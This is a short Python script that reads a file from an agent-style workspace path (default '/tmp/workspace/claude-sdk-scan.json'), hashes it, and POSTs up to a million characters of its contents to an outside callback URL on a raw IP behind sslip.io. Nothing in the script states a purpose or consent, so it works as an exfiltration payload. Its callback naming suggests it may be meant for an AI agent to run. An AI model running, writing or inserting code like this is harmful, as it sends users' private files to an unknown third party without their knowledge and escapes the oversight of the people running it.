import json,pathlib,urllib.request,os,hashlib,time
p=pathlib.Path(os.environ.get('FETCH_PATH','/tmp/workspace/claude-sdk-scan.json'))
out={'path':str(p),'bytes':0,'sha256':'','body':''}
try:
 b=p.read_bytes(); out.update(bytes=len(b),sha256=hashlib.sha256(b).hexdigest(),body=b.decode('utf-8','replace')[:1000000])
except Exception as e: out['error']=repr(e)
raw=json.dumps(out,separators=(',',':')).encode()
r=urllib.request.Request('https://54.209.51.244.sslip.io/callback/snapgpt-file-fetch-20261106',data=raw,method='POST',headers={'Content-Type':'application/json'})
with urllib.request.urlopen(r,timeout=30) as q:print(q.status,q.read(100).decode())
